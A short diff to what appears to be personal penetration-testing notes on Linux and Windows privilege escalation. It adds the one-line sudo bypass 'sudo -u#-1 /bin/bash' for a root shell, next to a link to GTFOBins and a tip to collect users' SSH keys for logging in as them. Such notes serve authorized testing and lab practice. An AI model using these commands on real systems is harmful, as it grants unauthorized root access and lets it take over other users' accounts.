@@ -84,6 +84,7 @@ PrivescCheck.ps1
 
 ### sudo -L
 https://gtfobins.github.io/#+sudo
+sudo -u#-1 /bin/bash
 
 ### ls *.ssh/ 
 look for keys and try to login with them to other users
